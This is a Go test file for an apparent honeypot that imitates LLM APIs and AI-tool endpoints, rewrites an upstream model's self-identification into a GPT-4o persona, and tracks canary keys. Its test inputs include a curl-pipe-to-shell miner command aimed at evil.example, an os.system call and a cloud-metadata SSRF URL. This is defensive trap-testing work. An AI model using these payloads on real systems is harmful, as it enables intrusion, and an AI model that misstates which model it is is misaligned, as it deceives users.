package llmproxy

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"

	"github.com/harris/honeypot/internal/canary"
	"github.com/harris/honeypot/internal/hubgrpc"
	"github.com/harris/honeypot/internal/pki"
	"github.com/harris/honeypot/internal/spool"
	"github.com/harris/honeypot/internal/store"
	"github.com/harris/honeypot/internal/traps/llmproxy/budget"
	"github.com/harris/honeypot/internal/traps/llmproxy/chameleon"
	honeypotv1 "github.com/harris/honeypot/proto/gen/honeypot/v1"
)

func TestStreamSanitizerSplitTokensAndUTF8(t *testing.T) {
	p := chameleon.ResolvePersona(nil, "openai", "gpt-4o-2024-11-20")
	san := chameleon.NewStreamSanitizer(p)

	chunks := []string{"Hello, I am ", "Deep", "Seek, also ", "trained by Ali", "baba Qw", "en — Tiếng Việt ", "✓ safe!"}
	var out strings.Builder
	for _, c := range chunks {
		out.WriteString(san.Push(c))
	}
	out.WriteString(san.Flush())
	res := out.String()
	low := strings.ToLower(res)
	if strings.Contains(low, "deepseek") || strings.Contains(low, "qwen") || strings.Contains(low, "alibaba") {
		t.Fatalf("leak terms survived split-chunk sanitizer: %q", res)
	}
	if !strings.Contains(res, "OpenAI gpt-4o-2024-11-20") || !strings.Contains(res, "Tiếng Việt ✓ safe!") {
		t.Fatalf("expected clean persona rewrite & intact UTF-8, got %q", res)
	}
}

func TestRedisLuaCircuitBreakerConcurrencyZeroOverspend(t *testing.T) {
	if os.Getenv("RUN_INTEGRATION_TESTS") != "1" {
		t.Skip("set RUN_INTEGRATION_TESTS=1 to test Redis Lua circuit breaker")
	}
	redisAddr := envOrDefault("HIVE_REDIS_ADDR", "127.0.0.1:16379")
	rd, err := store.OpenRedis(context.Background(), redisAddr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = rd.Close() }()

	prefix := "honeypot:llm:testcb"
	dayKey := prefix + ":usd:" + time.Now().UTC().Format("2006-01-02")
	_ = rd.Client.Del(context.Background(), dayKey).Err()
	defer func() { _ = rd.Client.Del(context.Background(), dayKey).Err() }()

	// Cap at $0.020 ($0.002 per call = max 10 calls allowed across 50 concurrent goroutines)
	cb := budget.NewCircuitBreaker(rd.Client, budget.BudgetConfig{
		KeyPrefix:         prefix,
		MaxDailyUSD:       0.020,
		EstCostPerCallUSD: 0.002,
		MaxKeyTokensDay:   500_000,
		MaxIPRPM:          1000,
	})

	// 1. llm_pool /key/generate key must NEVER draw down paid USD budget
	decPool, err := cb.TryAcquire(context.Background(), "key-pool-1", "llm_pool", false, "198.51.100.2")
	if err != nil || decPool.AllowedPaid {
		t.Fatalf("expected llm_pool key denied paid upstream, got %+v err=%v", decPool, err)
	}

	// 2. 50 concurrent goroutines with eligible seeded canary key -> at most 10 succeed!
	var wg sync.WaitGroup
	var allowed atomic.Int32
	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			dec, err := cb.TryAcquire(context.Background(), "key-seed-1", "cowrie_honeyfs", true, "198.51.100."+strconv.Itoa(10+idx))
			if err == nil && dec.AllowedPaid {
				allowed.Add(1)
			}
		}(i)
	}
	wg.Wait()

	if allowed.Load() != 10 {
		t.Fatalf("expected exactly 10 allowed calls at $0.020/$0.002 cap, got %d", allowed.Load())
	}
	if spent := cb.CurrentDailySpentUSD(context.Background()); spent > 0.020001 {
		t.Fatalf("overspend detected: spent=%.6f > cap=0.020", spent)
	}
}

func TestTarpitPerIPLimitAnd429Shedding(t *testing.T) {
	limiter := budget.NewTarpitLimiter(128, 2, 20*time.Millisecond, 500*time.Millisecond)
	ctx := context.Background()

	var wg sync.WaitGroup
	// Occupy both per-IP slots from 203.0.113.50
	started := make(chan struct{}, 2)
	release := make(chan struct{})
	for i := 0; i < 2; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			slowCtx, cancel := context.WithCancel(ctx)
			go func() {
				<-release
				cancel()
			}()
			started <- struct{}{}
			limiter.ServeSlowTarpitOr429(slowCtx, httptest.NewRecorder(), "203.0.113.50", "openai", "gpt-4o", true)
		}()
	}
	<-started
	<-started
	time.Sleep(15 * time.Millisecond)

	// 3rd simultaneous request from same IP sheds immediately to 429
	rec3 := httptest.NewRecorder()
	mode, _ := limiter.ServeSlowTarpitOr429(ctx, rec3, "203.0.113.50", "anthropic", "claude-3-7-sonnet-20250219", true)
	close(release)
	wg.Wait()

	if mode != "rate_limit_429" || rec3.Code != http.StatusTooManyRequests {
		t.Fatalf("expected 3rd concurrent request from same IP shed to 429, got mode=%s status=%d", mode, rec3.Code)
	}
}

func TestFullChameleonRelayAndAllFiveAIKEVs(t *testing.T) {
	if os.Getenv("RUN_INTEGRATION_TESTS") != "1" {
		t.Skip("set RUN_INTEGRATION_TESTS=1 for full Hive+Redis+PG Chameleon relay test")
	}
	ctx := context.Background()
	pgDSN := envOrDefault("HIVE_POSTGRES_DSN", "postgres://honeypot:honeypot_test_pw@127.0.0.1:15432/honeypot?sslmode=disable")
	redisAddr := envOrDefault("HIVE_REDIS_ADDR", "127.0.0.1:16379")

	pg, err := store.OpenPostgres(ctx, pgDSN)
	if err != nil {
		t.Fatal(err)
	}
	defer pg.Close()
	rd, err := store.OpenRedis(ctx, redisAddr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = rd.Close() }()

	// Mock cheap upstream returning DeepSeek leak split across SSE deltas
	mockUpstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		for _, tok := range []string{"Hello! I am ", "Deep", "Seek v3 here to help."} {
			_, _ = fmt.Fprintf(w, "data: {\"choices\":[{\"delta\":{\"content\":%q}}]}\n\n", tok)
		}
		_, _ = fmt.Fprint(w, "data: [DONE]\n\n")
	}))
	defer mockUpstream.Close()

	ca, err := pki.InitOrLoad(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	signer, _ := canary.NewSigner([]byte("0123456789abcdef0123456789abcdef"))

	hub := hubgrpc.NewServer(ca, pg, rd)
	hub.InitialCanarySeeder = func(c context.Context, nodeID string) ([]*honeypotv1.CanaryKeySeed, error) {
		return signer.MintDefaultPoolForNode(c, pg, nodeID)
	}
	relay := NewHiveRelay(pg, rd, UpstreamConfig{
		BaseURL: mockUpstream.URL,
		APIKey:  "sk-cheap-upstream-secret",
		Model:   "deepseek-chat",
	}, budget.BudgetConfig{MaxDailyUSD: 5.0})
	hub.RelayLLMHandler = relay.HandleRelayStream

	srvCert, _, _, err := ca.IssueServerCert([]string{"127.0.0.1", "hive.internal", "enroll.hive.internal"})
	if err != nil {
		t.Fatal(err)
	}
	gs := hub.BuildGRPCServer()
	honeypotv1.RegisterSensorControlServiceServer(gs, hub)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	httpSrv := &http.Server{Handler: hub.BuildHTTPMux(gs), TLSConfig: pki.BuildHiveIngressTLSConfig(ca, srvCert)}
	go func() { _ = httpSrv.ServeTLS(ln, "", "") }()
	defer func() { _ = httpSrv.Close() }()

	// Enroll a Sensor node & retrieve its pre-minted Canary Key pool
	rawTok, tokHash, _ := pki.GenerateJoinToken()
	_, err = pg.CreateJoinToken(ctx, tokHash, "sensor", "llm-sensor-"+strconv.FormatInt(time.Now().UnixNano(), 10), "sg", time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	enrollTLS := &tls.Config{RootCAs: ca.RootPool(), ServerName: "enroll.hive.internal", MinVersion: tls.VersionTLS13}
	enrollConn, err := grpc.NewClient(ln.Addr().String(), grpc.WithTransportCredentials(credentials.NewTLS(enrollTLS)))
	if err != nil {
		t.Fatal(err)
	}
	enrollCli := honeypotv1.NewSensorControlServiceClient(enrollConn)
	keyPEM, csrPEM, _ := pki.GenerateClientKeyAndCSR("sensor-llm")
	enrollResp, err := enrollCli.EnrollNode(ctx, &honeypotv1.EnrollNodeRequest{JoinToken: rawTok, CsrPem: csrPEM})
	_ = enrollConn.Close()
	if err != nil {
		t.Fatal(err)
	}

	cStore, _ := pki.OpenClientCertStore(t.TempDir())
	if err := cStore.SaveInitial(enrollResp.GetNodeId(), enrollResp.GetRootCaPem(), enrollResp.GetClientCertPem(), keyPEM); err != nil {
		t.Fatal(err)
	}
	mtlsCfg, err := cStore.ClientTLSConfig("hive.internal")
	if err != nil {
		t.Fatal(err)
	}
	sensorConn, err := grpc.NewClient(ln.Addr().String(), grpc.WithTransportCredentials(credentials.NewTLS(mtlsCfg)))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = sensorConn.Close() }()

	sp, err := spool.OpenBoltSpool(t.TempDir()+"/spool.db", 10*1024*1024)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = sp.Close() }()

	pool := canary.NewSensorKeyPool()
	pool.AddSeeds(enrollResp.GetCanaryKeys())

	router := NewRouter(enrollResp.GetNodeId(), "https://ai.example", honeypotv1.NewSensorControlServiceClient(sensorConn), pool, sp, budget.NewTarpitLimiter(16, 2, 10*time.Millisecond, time.Second), nil)
	trapSrv := httptest.NewServer(router)
	defer trapSrv.Close()

	// Find our seeded cowrie openai key (paid eligible = true)
	seedOAI, ok := pool.PeekBySource("cowrie_honeyfs", "openai")
	if !ok {
		t.Fatal("missing cowrie_honeyfs openai seed")
	}

	// 1. OpenAI SSE chat completion with leaked seeded key -> verifies upstream sanitized DeepSeek -> GPT-4o!
	reqOAI, _ := http.NewRequest(http.MethodPost, trapSrv.URL+"/v1/chat/completions", strings.NewReader(`{"model":"gpt-4o","stream":true,"messages":[{"role":"user","content":"which model are you? nonce-1"}]}`))
	reqOAI.Header.Set("Authorization", "Bearer "+seedOAI.GetKeyPlaintext())
	reqOAI.Header.Set("Content-Type", "application/json")
	respOAI, err := trapSrv.Client().Do(reqOAI)
	if err != nil || respOAI.StatusCode != 200 {
		t.Fatalf("OpenAI SSE failed: %v %v", respOAI, err)
	}
	oaiBody, _ := io.ReadAll(respOAI.Body)
	_ = respOAI.Body.Close()
	if strings.Contains(strings.ToLower(string(oaiBody)), "deepseek") {
		t.Fatalf("DeepSeek leaked in OpenAI SSE: %s", string(oaiBody))
	}
	if !strings.Contains(string(oaiBody), "[DONE]") || !strings.Contains(string(oaiBody), "gpt-4o") {
		t.Fatalf("unexpected OpenAI SSE framing: %s", string(oaiBody))
	}

	// 2. Anthropic SSE messages format check
	reqAnt, _ := http.NewRequest(http.MethodPost, trapSrv.URL+"/v1/messages", strings.NewReader(`{"model":"claude-3-7-sonnet-20250219","stream":true,"messages":[{"role":"user","content":"hi claude"}]}`))
	reqAnt.Header.Set("x-api-key", seedOAI.GetKeyPlaintext())
	respAnt, err := trapSrv.Client().Do(reqAnt)
	if err != nil || respAnt.StatusCode != 200 {
		t.Fatalf("Anthropic SSE failed: %v", err)
	}
	antBody, _ := io.ReadAll(respAnt.Body)
	_ = respAnt.Body.Close()
	if !strings.Contains(string(antBody), "event: message_start") || !strings.Contains(string(antBody), "event: message_stop") {
		t.Fatalf("expected Anthropic SSE sequence, got %s", string(antBody))
	}

	// 3. Langflow /api/v1/validate/code
	lfResp, err := trapSrv.Client().Post(trapSrv.URL+"/api/v1/validate/code", "application/json", strings.NewReader(`{"code":"def f():\n  os.system('id')"}`))
	if err != nil || lfResp.StatusCode != 200 {
		t.Fatalf("Langflow failed: %v", err)
	}
	_ = lfResp.Body.Close()

	// 4. ShadowRay /api/jobs/
	srResp, err := trapSrv.Client().Post(trapSrv.URL+"/api/jobs/", "application/json", strings.NewReader(`{"entrypoint":"curl http://evil.example/miner.sh | sh"}`))
	if err != nil || srResp.StatusCode != 200 {
		t.Fatalf("ShadowRay failed: %v", err)
	}
	srB, _ := io.ReadAll(srResp.Body)
	_ = srResp.Body.Close()
	if !strings.Contains(string(srB), "raysubmit_") {
		t.Fatalf("expected raysubmit_ job ID, got %s", string(srB))
	}

	// 5. Ollama /api/pull & /api/show
	olResp, _ := trapSrv.Client().Post(trapSrv.URL+"/api/show", "application/json", strings.NewReader(`{"name":"llama3.1"}`))
	olB, _ := io.ReadAll(olResp.Body)
	_ = olResp.Body.Close()
	if !strings.Contains(string(olB), "sk-proj-") {
		t.Fatalf("expected Canary leak in Ollama /api/show Modelfile, got %s", string(olB))
	}

	// 6. vLLM video_url SSRF
	vlResp, _ := trapSrv.Client().Post(trapSrv.URL+"/v1/chat/completions", "application/json", strings.NewReader(`{"model":"gpt-4o","messages":[{"role":"user","content":[{"type":"video_url","video_url":{"url":"http://169.254.169.254/latest/meta-data"}}]}]}`))
	if vlResp.StatusCode != 400 {
		t.Fatalf("expected vLLM SSRF capture 400 InvalidMediaError, got %d", vlResp.StatusCode)
	}
	_ = vlResp.Body.Close()

	// 7. LiteLLM /key/generate -> dispense pool key -> reuse in /v1/chat/completions at $0 cost
	lkResp, _ := trapSrv.Client().Post(trapSrv.URL+"/key/generate", "application/json", strings.NewReader(`{"duration":"1h"}`))
	lkB, _ := io.ReadAll(lkResp.Body)
	_ = lkResp.Body.Close()
	if !strings.Contains(string(lkB), `"key":"sk-`) {
		t.Fatalf("expected dispensed Canary key on LiteLLM /key/generate, got %s", string(lkB))
	}

	sum := sha256.Sum256([]byte(seedOAI.GetKeyPlaintext()))
	rec, found, err := canary.LookupByHash(ctx, pg, hex.EncodeToString(sum[:]))
	if err != nil || !found || rec.HitCount == 0 {
		t.Fatalf("expected canary_keys hit_count incremented on Hive, rec=%+v found=%v err=%v", rec, found, err)
	}
}

func envOrDefault(k, fallback string) string {
	if v := strings.TrimSpace(os.Getenv(k)); v != "" {
		return v
	}
	return fallback
}
